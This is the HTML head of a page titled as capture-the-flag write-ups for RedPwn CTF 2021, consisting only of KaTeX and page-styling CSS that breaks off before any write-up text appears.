<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>RedPwn CTF 2021 Challenge Writups</title>
        <style>
/* From extension vscode.markdown-math */
@font-face{font-family:KaTeX_AMS;src:url(fonts/KaTeX_AMS-Regular.woff2) format("woff2"),url(fonts/KaTeX_AMS-Regular.woff) format("woff"),url(fonts/KaTeX_AMS-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Caligraphic;src:url(fonts/KaTeX_Caligraphic-Bold.woff2) format("woff2"),url(fonts/KaTeX_Caligraphic-Bold.woff) format("woff"),url(fonts/KaTeX_Caligraphic-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Caligraphic;src:url(fonts/KaTeX_Caligraphic-Regular.woff2) format("woff2"),url(fonts/KaTeX_Caligraphic-Regular.woff) format("woff"),url(fonts/KaTeX_Caligraphic-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Fraktur;src:url(fonts/KaTeX_Fraktur-Bold.woff2) format("woff2"),url(fonts/KaTeX_Fraktur-Bold.woff) format("woff"),url(fonts/KaTeX_Fraktur-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Fraktur;src:url(fonts/KaTeX_Fraktur-Regular.woff2) format("woff2"),url(fonts/KaTeX_Fraktur-Regular.woff) format("woff"),url(fonts/KaTeX_Fraktur-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Bold.woff2) format("woff2"),url(fonts/KaTeX_Main-Bold.woff) format("woff"),url(fonts/KaTeX_Main-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-BoldItalic.woff2) format("woff2"),url(fonts/KaTeX_Main-BoldItalic.woff) format("woff"),url(fonts/KaTeX_Main-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Italic.woff2) format("woff2"),url(fonts/KaTeX_Main-Italic.woff) format("woff"),url(fonts/KaTeX_Main-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Regular.woff2) format("woff2"),url(fonts/KaTeX_Main-Regular.woff) format("woff"),url(fonts/KaTeX_Main-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Math;src:url(fonts/KaTeX_Math-BoldItalic.woff2) format("woff2"),url(fonts/KaTeX_Math-BoldItalic.woff) format("woff"),url(fonts/KaTeX_Math-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic}@font-face{font-family:KaTeX_Math;src:url(fonts/KaTeX_Math-Italic.woff2) format("woff2"),url(fonts/KaTeX_Math-Italic.woff) format("woff"),url(fonts/KaTeX_Math-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Bold.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Bold.woff) format("woff"),url(fonts/KaTeX_SansSerif-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Italic.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Italic.woff) format("woff"),url(fonts/KaTeX_SansSerif-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Regular.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Regular.woff) format("woff"),url(fonts/KaTeX_SansSerif-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Script;src:url(fonts/KaTeX_Script-Regular.woff2) format("woff2"),url(fonts/KaTeX_Script-Regular.woff) format("woff"),url(fonts/KaTeX_Script-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size1;src:url(fonts/KaTeX_Size1-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size1-Regular.woff) format("woff"),url(fonts/KaTeX_Size1-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size2;src:url(fonts/KaTeX_Size2-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size2-Regular.woff) format("woff"),url(fonts/KaTeX_Size2-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size3;src:url(fonts/KaTeX_Size3-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size3-Regular.woff) format("woff"),url(fonts/KaTeX_Size3-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size4;src:url(fonts/KaTeX_Size4-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size4-Regular.woff) format("woff"),url(fonts/KaTeX_Size4-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Typewriter;src:url(fonts/KaTeX_Typewriter-Regular.woff2) format("woff2"),url(fonts/KaTeX_Typewriter-Regular.woff) format("woff"),url(fonts/KaTeX_Typewriter-Regular.ttf) format("truetype");font-weight:400;font-style:normal}.katex{font:normal 1.21em KaTeX_Main,Times New Roman,serif;line-height:1.2;text-indent:0;text-rendering:auto;border-color:currentColor}.katex *{-ms-high-contrast-adjust:none!important}.katex .katex-version:after{content:"0.13.0"}.katex .katex-mathml{position:absolute;clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:1px;overflow:hidden}.katex .katex-html>.newline{display:block}.katex .base{position:relative;white-space:nowrap;width:-webkit-min-content;width:-moz-min-content;width:min-content}.katex .base,.katex .strut{display:inline-block}.katex .textbf{font-weight:700}.katex .textit{font-style:italic}.katex .textrm{font-family:KaTeX_Main}.katex .textsf{font-family:KaTeX_SansSerif}.katex .texttt{font-family:KaTeX_Typewriter}.katex .mathnormal{font-family:KaTeX_Math;font-style:italic}.katex .mathit{font-family:KaTeX_Main;font-style:italic}.katex .mathrm{font-style:normal}.katex .mathbf{font-family:KaTeX_Main;font-weight:700}.katex .boldsymbol{font-family:KaTeX_Math;font-weight:700;font-style:italic}.katex .amsrm,.katex .mathbb,.katex .textbb{font-family:KaTeX_AMS}.katex .mathcal{font-family:KaTeX_Caligraphic}.katex .mathfrak,.katex .textfrak{font-family:KaTeX_Fraktur}.katex .mathtt{font-family:KaTeX_Typewriter}.katex .mathscr,.katex .textscr{font-family:KaTeX_Script}.katex .mathsf,.katex .textsf{font-family:KaTeX_SansSerif}.katex .mathboldsf,.katex .textboldsf{font-family:KaTeX_SansSerif;font-weight:700}.katex .mathitsf,.katex .textitsf{font-family:KaTeX_SansSerif;font-style:italic}.katex .mainrm{font-family:KaTeX_Main;font-style:normal}.katex .vlist-t{display:inline-table;table-layout:fixed;border-collapse:collapse}.katex .vlist-r{display:table-row}.katex .vlist{display:table-cell;vertical-align:bottom;position:relative}.katex .vlist>span{display:block;height:0;position:relative}.katex .vlist>span>span{display:inline-block}.katex .vlist>span>.pstrut{overflow:hidden;width:0}.katex .vlist-t2{margin-right:-2px}.katex .vlist-s{display:table-cell;vertical-align:bottom;font-size:1px;width:2px;min-width:2px}.katex .vbox{display:inline-flex;flex-direction:column;align-items:baseline}.katex .hbox{width:100%}.katex .hbox,.katex .thinbox{display:inline-flex;flex-direction:row}.katex .thinbox{width:0;max-width:0}.katex .msupsub{text-align:left}.katex .mfrac>span>span{text-align:center}.katex .mfrac .frac-line{display:inline-block;width:100%;border-bottom-style:solid}.katex .hdashline,.katex .hline,.katex .mfrac .frac-line,.katex .overline .overline-line,.katex .rule,.katex .underline .underline-line{min-height:1px}.katex .mspace{display:inline-block}.katex .clap,.katex .llap,.katex .rlap{width:0;position:relative}.katex .clap>.inner,.katex .llap>.inner,.katex .rlap>.inner{position:absolute}.katex .clap>.fix,.katex .llap>.fix,.katex .rlap>.fix{display:inline-block}.katex .llap>.inner{right:0}.katex .clap>.inner,.katex .rlap>.inner{left:0}.katex .clap>.inner>span{margin-left:-50%;margin-right:50%}.katex .rule{display:inline-block;border:0 solid;position:relative}.katex .hline,.katex .overline .overline-line,.katex .underline .underline-line{display:inline-block;width:100%;border-bottom-style:solid}.katex .hdashline{display:inline-block;width:100%;border-bottom-style:dashed}.katex .sqrt>.root{margin-left:.27777778em;margin-right:-.55555556em}.katex .fontsize-ensurer.reset-size1.size1,.katex .sizing.reset-size1.size1{font-size:1em}.katex .fontsize-ensurer.reset-size1.size2,.katex .sizing.reset-size1.size2{font-size:1.2em}.katex .fontsize-ensurer.reset-size1.size3,.katex .sizing.reset-size1.size3{font-size:1.4em}.katex .fontsize-ensurer.reset-size1.size4,.katex .sizing.reset-size1.size4{font-size:1.6em}.katex .fontsize-ensurer.reset-size1.size5,.katex .sizing.reset-size1.size5{font-size:1.8em}.katex .fontsize-ensurer.reset-size1.size6,.katex .sizing.reset-size1.size6{font-size:2em}.katex .fontsize-ensurer.reset-size1.size7,.katex .sizing.reset-size1.size7{font-size:2.4em}.katex .fontsize-ensurer.reset-size1.size8,.katex .sizing.reset-size1.size8{font-size:2.88em}.katex .fontsize-ensurer.reset-size1.size9,.katex .sizing.reset-size1.size9{font-size:3.456em}.katex .fontsize-ensurer.reset-size1.size10,.katex .sizing.reset-size1.size10{font-size:4.148em}.katex .fontsize-ensurer.reset-size1.size11,.katex .sizing.reset-size1.size11{font-size:4.976em}.katex .fontsize-ensurer.reset-size2.size1,.katex .sizing.reset-size2.size1{font-size:.83333333em}.katex .fontsize-ensurer.reset-size2.size2,.katex .sizing.reset-size2.size2{font-size:1em}.katex .fontsize-ensurer.reset-size2.size3,.katex .sizing.reset-size2.size3{font-size:1.16666667em}.katex .fontsize-ensurer.reset-size2.size4,.katex .sizing.reset-size2.size4{font-size:1.33333333em}.katex .fontsize-ensurer.reset-size2.size5,.katex .sizing.reset-size2.size5{font-size:1.5em}.katex .fontsize-ensurer.reset-size2.size6,.katex .sizing.reset-size2.size6{font-size:1.66666667em}.katex .fontsize-ensurer.reset-size2.size7,.katex .sizing.reset-size2.size7{font-size:2em}.katex .fontsize-ensurer.reset-size2.size8,.katex .sizing.reset-size2.size8{font-size:2.4em}.katex .fontsize-ensurer.reset-size2.size9,.katex .sizing.reset-size2.size9{font-size:2.88em}.katex .fontsize-ensurer.reset-size2.size10,.katex .sizing.reset-size2.size10{font-size:3.45666667em}.katex .fontsize-ensurer.reset-size2.size11,.katex .sizing.reset-size2.size11{font-size:4.14666667em}.katex .fontsize-ensurer.reset-size3.size1,.katex .sizing.reset-size3.size1{font-size:.71428571em}.katex .fontsize-ensurer.reset-size3.size2,.katex .sizing.reset-size3.size2{font-size:.85714286em}.katex .fontsize-ensurer.reset-size3.size3,.katex .sizing.reset-size3.size3{font-size:1em}.katex .fontsize-ensurer.reset-size3.size4,.katex .sizing.reset-size3.size4{font-size:1.14285714em}.katex .fontsize-ensurer.reset-size3.size5,.katex .sizing.reset-size3.size5{font-size:1.28571429em}.katex .fontsize-ensurer.reset-size3.size6,.katex .sizing.reset-size3.size6{font-size:1.42857143em}.katex .fontsize-ensurer.reset-size3.size7,.katex .sizing.reset-size3.size7{font-size:1.71428571em}.katex .fontsize-ensurer.reset-size3.size8,.katex .sizing.reset-size3.size8{font-size:2.05714286em}.katex .fontsize-ensurer.reset-size3.size9,.katex .sizing.reset-size3.size9{font-size:2.46857143em}.katex .fontsize-ensurer.reset-size3.size10,.katex .sizing.reset-size3.size10{font-size:2.96285714em}.katex .fontsize-ensurer.reset-size3.size11,.katex .sizing.reset-size3.size11{font-size:3.55428571em}.katex .fontsize-ensurer.reset-size4.size1,.katex .sizing.reset-size4.size1{font-size:.625em}.katex .fontsize-ensurer.reset-size4.size2,.katex .sizing.reset-size4.size2{font-size:.75em}.katex .fontsize-ensurer.reset-size4.size3,.katex .sizing.reset-size4.size3{font-size:.875em}.katex .fontsize-ensurer.reset-size4.size4,.katex .sizing.reset-size4.size4{font-size:1em}.katex .fontsize-ensurer.reset-size4.size5,.katex .sizing.reset-size4.size5{font-size:1.125em}.katex .fontsize-ensurer.reset-size4.size6,.katex .sizing.reset-size4.size6{font-size:1.25em}.katex .fontsize-ensurer.reset-size4.size7,.katex .sizing.reset-size4.size7{font-size:1.5em}.katex .fontsize-ensurer.reset-size4.size8,.katex .sizing.reset-size4.size8{font-size:1.8em}.katex .fontsize-ensurer.reset-size4.size9,.katex .sizing.reset-size4.size9{font-size:2.16em}.katex .fontsize-ensurer.reset-size4.size10,.katex .sizing.reset-size4.size10{font-size:2.5925em}.katex .fontsize-ensurer.reset-size4.size11,.katex .sizing.reset-size4.size11{font-size:3.11em}.katex .fontsize-ensurer.reset-size5.size1,.katex .sizing.reset-size5.size1{font-size:.55555556em}.katex .fontsize-ensurer.reset-size5.size2,.katex .sizing.reset-size5.size2{font-size:.66666667em}.katex .fontsize-ensurer.reset-size5.size3,.katex .sizing.reset-size5.size3{font-size:.77777778em}.katex .fontsize-ensurer.reset-size5.size4,.katex .sizing.reset-size5.size4{font-size:.88888889em}.katex .fontsize-ensurer.reset-size5.size5,.katex .sizing.reset-size5.size5{font-size:1em}.katex .fontsize-ensurer.reset-size5.size6,.katex .sizing.reset-size5.size6{font-size:1.11111111em}.katex .fontsize-ensurer.reset-size5.size7,.katex .sizing.reset-size5.size7{font-size:1.33333333em}.katex .fontsize-ensurer.reset-size5.size8,.katex .sizing.reset-size5.size8{font-size:1.6em}.katex .fontsize-ensurer.reset-size5.size9,.katex .sizing.reset-size5.size9{font-size:1.92em}.katex .fontsize-ensurer.reset-size5.size10,.katex .sizing.reset-size5.size10{font-size:2.30444444em}.katex .fontsize-ensurer.reset-size5.size11,.katex .sizing.reset-size5.size11{font-size:2.76444444em}.katex .fontsize-ensurer.reset-size6.size1,.katex .sizing.reset-size6.size1{font-size:.5em}.katex .fontsize-ensurer.reset-size6.size2,.katex .sizing.reset-size6.size2{font-size:.6em}.katex .fontsize-ensurer.reset-size6.size3,.katex .sizing.reset-size6.size3{font-size:.7em}.katex .fontsize-ensurer.reset-size6.size4,.katex .sizing.reset-size6.size4{font-size:.8em}.katex .fontsize-ensurer.reset-size6.size5,.katex .sizing.reset-size6.size5{font-size:.9em}.katex .fontsize-ensurer.reset-size6.size6,.katex .sizing.reset-size6.size6{font-size:1em}.katex .fontsize-ensurer.reset-size6.size7,.katex .sizing.reset-size6.size7{font-size:1.2em}.katex .fontsize-ensurer.reset-size6.size8,.katex .sizing.reset-size6.size8{font-size:1.44em}.katex .fontsize-ensurer.reset-size6.size9,.katex .sizing.reset-size6.size9{font-size:1.728em}.katex .fontsize-ensurer.reset-size6.size10,.katex .sizing.reset-size6.size10{font-size:2.074em}.katex .fontsize-ensurer.reset-size6.size11,.katex .sizing.reset-size6.size11{font-size:2.488em}.katex .fontsize-ensurer.reset-size7.size1,.katex .sizing.reset-size7.size1{font-size:.41666667em}.katex .fontsize-ensurer.reset-size7.size2,.katex .sizing.reset-size7.size2{font-size:.5em}.katex .fontsize-ensurer.reset-size7.size3,.katex .sizing.reset-size7.size3{font-size:.58333333em}.katex .fontsize-ensurer.reset-size7.size4,.katex .sizing.reset-size7.size4{font-size:.66666667em}.katex .fontsize-ensurer.reset-size7.size5,.katex .sizing.reset-size7.size5{font-size:.75em}.katex .fontsize-ensurer.reset-size7.size6,.katex .sizing.reset-size7.size6{font-size:.83333333em}.katex .fontsize-ensurer.reset-size7.size7,.katex .sizing.reset-size7.size7{font-size:1em}.katex .fontsize-ensurer.reset-size7.size8,.katex .sizing.reset-size7.size8{font-size:1.2em}.katex .fontsize-ensurer.reset-size7.size9,.katex .sizing.reset-size7.size9{font-size:1.44em}.katex .fontsize-ensurer.reset-size7.size10,.katex .sizing.reset-size7.size10{font-size:1.72833333em}.katex .fontsize-ensurer.reset-size7.size11,.katex .sizing.reset-size7.size11{font-size:2.07333333em}.katex .fontsize-ensurer.reset-size8.size1,.katex .sizing.reset-size8.size1{font-size:.34722222em}.katex .fontsize-ensurer.reset-size8.size2,.katex .sizing.reset-size8.size2{font-size:.41666667em}.katex .fontsize-ensurer.reset-size8.size3,.katex .sizing.reset-size8.size3{font-size:.48611111em}.katex .fontsize-ensurer.reset-size8.size4,.katex .sizing.reset-size8.size4{font-size:.55555556em}.katex .fontsize-ensurer.reset-size8.size5,.katex .sizing.reset-size8.size5{font-size:.625em}.katex .fontsize-ensurer.reset-size8.size6,.katex .sizing.reset-size8.size6{font-size:.69444444em}.katex .fontsize-ensurer.reset-size8.size7,.katex .sizing.reset-size8.size7{font-size:.83333333em}.katex .fontsize-ensurer.reset-size8.size8,.katex .sizing.reset-size8.size8{font-size:1em}.katex .fontsize-ensurer.reset-size8.size9,.katex .sizing.reset-size8.size9{font-size:1.2em}.katex .fontsize-ensurer.reset-size8.size10,.katex .sizing.reset-size8.size10{font-size:1.44027778em}.katex .fontsize-ensurer.reset-size8.size11,.katex .sizing.reset-size8.size11{font-size:1.72777778em}.katex .fontsize-ensurer.reset-size9.size1,.katex .sizing.reset-size9.size1{font-size:.28935185em}.katex .fontsize-ensurer.reset-size9.size2,.katex .sizing.reset-size9.size2{font-size:.34722222em}.katex .fontsize-ensurer.reset-size9.size3,.katex .sizing.reset-size9.size3{font-size:.40509259em}.katex .fontsize-ensurer.reset-size9.size4,.katex .sizing.reset-size9.size4{font-size:.46296296em}.katex .fontsize-ensurer.reset-size9.size5,.katex .sizing.reset-size9.size5{font-size:.52083333em}.katex .fontsize-ensurer.reset-size9.size6,.katex .sizing.reset-size9.size6{font-size:.5787037em}.katex .fontsize-ensurer.reset-size9.size7,.katex .sizing.reset-size9.size7{font-size:.69444444em}.katex .fontsize-ensurer.reset-size9.size8,.katex .sizing.reset-size9.size8{font-size:.83333333em}.katex .fontsize-ensurer.reset-size9.size9,.katex .sizing.reset-size9.size9{font-size:1em}.katex .fontsize-ensurer.reset-size9.size10,.katex .sizing.reset-size9.size10{font-size:1.20023148em}.katex .fontsize-ensurer.reset-size9.size11,.katex .sizing.reset-size9.size11{font-size:1.43981481em}.katex .fontsize-ensurer.reset-size10.size1,.katex .sizing.reset-size10.size1{font-size:.24108004em}.katex .fontsize-ensurer.reset-size10.size2,.katex .sizing.reset-size10.size2{font-size:.28929605em}.katex .fontsize-ensurer.reset-size10.size3,.katex .sizing.reset-size10.size3{font-size:.33751205em}.katex .fontsize-ensurer.reset-size10.size4,.katex .sizing.reset-size10.size4{font-size:.38572806em}.katex .fontsize-ensurer.reset-size10.size5,.katex .sizing.reset-size10.size5{font-size:.43394407em}.katex .fontsize-ensurer.reset-size10.size6,.katex .sizing.reset-size10.size6{font-size:.48216008em}.katex .fontsize-ensurer.reset-size10.size7,.katex .sizing.reset-size10.size7{font-size:.57859209em}.katex .fontsize-ensurer.reset-size10.size8,.katex .sizing.reset-size10.size8{font-size:.69431051em}.katex .fontsize-ensurer.reset-size10.size9,.katex .sizing.reset-size10.size9{font-size:.83317261em}.katex .fontsize-ensurer.reset-size10.size10,.katex .sizing.reset-size10.size10{font-size:1em}.katex .fontsize-ensurer.reset-size10.size11,.katex .sizing.reset-size10.size11{font-size:1.19961427em}.katex .fontsize-ensurer.reset-size11.size1,.katex .sizing.reset-size11.size1{font-size:.20096463em}.katex .fontsize-ensurer.reset-size11.size2,.katex .sizing.reset-size11.size2{font-size:.24115756em}.katex .fontsize-ensurer.reset-size11.size3,.katex .sizing.reset-size11.size3{font-size:.28135048em}.katex .fontsize-ensurer.reset-size11.size4,.katex .sizing.reset-size11.size4{font-size:.32154341em}.katex .fontsize-ensurer.reset-size11.size5,.katex .sizing.reset-size11.size5{font-size:.36173633em}.katex .fontsize-ensurer.reset-size11.size6,.katex .sizing.reset-size11.size6{font-size:.40192926em}.katex .fontsize-ensurer.reset-size11.size7,.katex .sizing.reset-size11.size7{font-size:.48231511em}.katex .fontsize-ensurer.reset-size11.size8,.katex .sizing.reset-size11.size8{font-size:.57877814em}.katex .fontsize-ensurer.reset-size11.size9,.katex .sizing.reset-size11.size9{font-size:.69453376em}.katex .fontsize-ensurer.reset-size11.size10,.katex .sizing.reset-size11.size10{font-size:.83360129em}.katex .fontsize-ensurer.reset-size11.size11,.katex .sizing.reset-size11.size11{font-size:1em}.katex .delimsizing.size1{font-family:KaTeX_Size1}.katex .delimsizing.size2{font-family:KaTeX_Size2}.katex .delimsizing.size3{font-family:KaTeX_Size3}.katex .delimsizing.size4{font-family:KaTeX_Size4}.katex .delimsizing.mult .delim-size1>span{font-family:KaTeX_Size1}.katex .delimsizing.mult .delim-size4>span{font-family:KaTeX_Size4}.katex .nulldelimiter{display:inline-block;width:.12em}.katex .delimcenter,.katex .op-symbol{position:relative}.katex .op-symbol.small-op{font-family:KaTeX_Size1}.katex .op-symbol.large-op{font-family:KaTeX_Size2}.katex .accent>.vlist-t,.katex .op-limits>.vlist-t{text-align:center}.katex .accent .accent-body{position:relative}.katex .accent .accent-body:not(.accent-full){width:0}.katex .overlay{display:block}.katex .mtable .vertical-separator{display:inline-block;min-width:1px}.katex .mtable .arraycolsep{display:inline-block}.katex .mtable .col-align-c>.vlist-t{text-align:center}.katex .mtable .col-align-l>.vlist-t{text-align:left}.katex .mtable .col-align-r>.vlist-t{text-align:right}.katex .svg-align{text-align:left}.katex svg{display:block;position:absolute;width:100%;height:inherit;fill:currentColor;stroke:currentColor;fill-rule:nonzero;fill-opacity:1;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-dasharray:none;stroke-dashoffset:0;stroke-opacity:1}.katex svg path{stroke:none}.katex img{border-style:none;min-width:0;min-height:0;max-width:none;max-height:none}.katex .stretchy{width:100%;display:block;position:relative;overflow:hidden}.katex .stretchy:after,.katex .stretchy:before{content:""}.katex .hide-tail{width:100%;position:relative;overflow:hidden}.katex .halfarrow-left{position:absolute;left:0;width:50.2%;overflow:hidden}.katex .halfarrow-right{position:absolute;right:0;width:50.2%;overflow:hidden}.katex .brace-left{position:absolute;left:0;width:25.1%;overflow:hidden}.katex .brace-center{position:absolute;left:25%;width:50%;overflow:hidden}.katex .brace-right{position:absolute;right:0;width:25.1%;overflow:hidden}.katex .x-arrow-pad{padding:0 .5em}.katex .cd-arrow-pad{padding:0 .55556em 0 .27778em}.katex .mover,.katex .munder,.katex .x-arrow{text-align:center}.katex .boxpad{padding:0 .3em}.katex .fbox,.katex .fcolorbox{box-sizing:border-box;border:.04em solid}.katex .cancel-pad{padding:0 .2em}.katex .cancel-lap{margin-left:-.2em;margin-right:-.2em}.katex .sout{border-bottom-style:solid;border-bottom-width:.08em}.katex .angl{box-sizing:border-content;border-top:.049em solid;border-right:.049em solid;margin-right:.03889em}.katex .anglpad{padding:0 .03889em}.katex .eqn-num:before{counter-increment:katexEqnNo;content:"(" counter(katexEqnNo) ")"}.katex .mml-eqn-num:before{counter-increment:mmlEqnNo;content:"(" counter(mmlEqnNo) ")"}.katex .mtr-glue{width:50%}.katex .cd-vert-arrow{display:inline-block;position:relative}.katex .cd-label-left{display:inline-block;position:absolute;right:calc(50% + .3em);text-align:left}.katex .cd-label-right{display:inline-block;position:absolute;left:calc(50% + .3em);text-align:right}.katex-display{display:block;margin:1em 0;text-align:center}.katex-display>.katex{display:block;text-align:center;white-space:nowrap}.katex-display>.katex>.katex-html{display:block;position:relative}.katex-display>.katex>.katex-html>.tag{position:absolute;right:0}.katex-display.leqno>.katex>.katex-html>.tag{left:0;right:auto}.katex-display.fleqn>.katex{text-align:left;padding-left:2em}body{counter-reset:katexEqnNo mmlEqnNo}

/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

.katex-error {
	color: var(--vscode-editorError-foreground);
}

</style>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
<link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
<style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
                font-size: 14px;
                line-height: 1.6;
            }
        </style>
        <style>
.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
</style>
        <style>
body{ margin: 0 auto; background: #000; font-family: Georgia, Palatino, serif; color: #EEE; line-height: 1; max-width: 960px; padding: 30px; } h1, h2, h3, h4 { font-weight: 400; } h1, h2, h3, h4, h5, p { margin-bottom: 24px; padding: 0; } h1 { font-size: 48px; } h2 { font-size: 36px; margin: 24px 0 6px; } h3 { font-size: 24px; } h4 { font-size: 21px; } h5 { font-size: 18px; } a { color: #61BFC1; margin: 0; padding: 0; text-decoration: none; vertical-align: baseline; } a:hover { text-decoration: underline; } a:visited { color: #466B6C; } ul, ol { padding: 0; margin: 0; } li { line-height: 24px; } li ul, li ul { margin-left: 24px; } p, ul, ol { font-size: 16px; line-height: 24px; max-width: 540px; } pre { padding: 0px 24px; max-width: 800px; white-space: pre-wrap; } code { font-family: Consolas, Monaco, Andale Mono, monospace; line-height: 1.5; font-size: 13px; } aside { display: block; float: right; width: 390px; } blockquote { border-left:.5em solid #eee; padding: 0 2em; margin-left:0; max-width: 476px; } blockquote cite { font-size:14px; line-height:20px; color:#bfbfbf; } blockquote cite:before { content: '\2014 \00A0'; } blockquote p { color: #666; max-width: 460px; } hr { width: 540px; text-align: left; margin: 0 auto 0 0; color: #999; } /* Code below this line is copyright Twitter Inc. */ button, input, select, textarea { font-size: 100%; margin: 0; vertical-align: baseline; *vertical-align: middle; } button, input { line-height: normal; *overflow: visible; } button::-moz-focus-inner, input::-moz-focus-inner { border: 0; padding: 0; } button, input[type="button"], input[type="reset"], input[type="submit"] { cursor: pointer; -webkit-appearance: button; } input[type=checkbox], input[type=radio] { cursor: pointer; } /* override default chrome & firefox settings */ input:not([type="image"]), textarea { -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; } input[type="search"] { -webkit-appearance: textfield; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; } input[type="search"]::-webkit-search-decoration { -webkit-appearance: none; } label, input, select, textarea { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px; font-weight: normal; line-height: normal; margin-bottom: 18px; } input[type=checkbox], input[type=radio] { cursor: pointer; margin-bottom: 0; } input[type=text], input[type=password], textarea, select { display: inline-block; width: 210px; padding: 4px; font-size: 13px; font-weight: normal; line-height: 18px; height: 18px; color: #808080; border: 1px solid #ccc; -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; } select, input[type=file] { height: 27px; line-height: 27px; } textarea { height: auto; } /* grey out placeholders */ :-moz-placeholder { color: #bfbfbf; } ::-webkit-input-placeholder { color: #bfbfbf; } input[type=text], input[type=password], select, textarea { -webkit-transition: border linear 0.2s, box-shadow linear 0.2s; -moz-transition: border linear 0.2s, box-shadow linear 0.2s; transition: border linear 0.2s, box-shadow linear 0.2s; -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1); -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1); box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1); } input[type=text]:focus, input[type=password]:focus, textarea:focus { outline: none; border-color: rgba(82, 168, 236, 0.8); -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); } /* buttons */ button { display: inline-block; padding: 4px 14px; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px; line-height: 18px; -webkit-border-radius: 4px; -moz-border-radius: 4px; border-radius: 4px; -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); background-color: #0064cd; background-repeat: repeat-x; background-image: -khtml-gradient(linear, left top, left bottom, from(#049cdb), to(#0064cd)); background-image: -moz-linear-gradient(top, #049cdb, #0064cd); background-image: -ms-linear-gradient(top, #049cdb, #0064cd); background-image: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #049cdb), color-stop(100%, #0064cd)); background-image: -webkit-linear-gradient(top, #049cdb, #0064cd); background-image: -o-linear-gradient(top, #049cdb, #0064cd); background-image: linear-gradient(top, #049cdb, #0064cd); color: #fff; text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25); border: 1px solid #004b9a; border-bottom-color: #003f81; -webkit-transition: 0.1s linear all; -moz-transition: 0.1s linear all; transition: 0.1s linear all; border-color: #0064cd #0064cd #003f81; border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25); } button:hover { color: #fff; background-position: 0 -15px; 